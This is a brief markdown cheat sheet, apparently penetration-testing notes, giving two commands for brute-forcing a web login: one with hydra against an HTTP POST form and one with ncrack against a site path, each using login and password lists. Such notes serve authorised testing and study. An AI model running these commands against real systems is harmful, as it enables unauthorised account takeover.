# Brute force attacks

## With hydra

```
hydra website.com http-post-form "/:login=^USER^&password=^PASS^:F=Wrong" -L logins.txt -P passwords.txt
```

## With ncrack

```
ncrack website.com -g path=/directory -U logins.txt -P passwords.txt
```
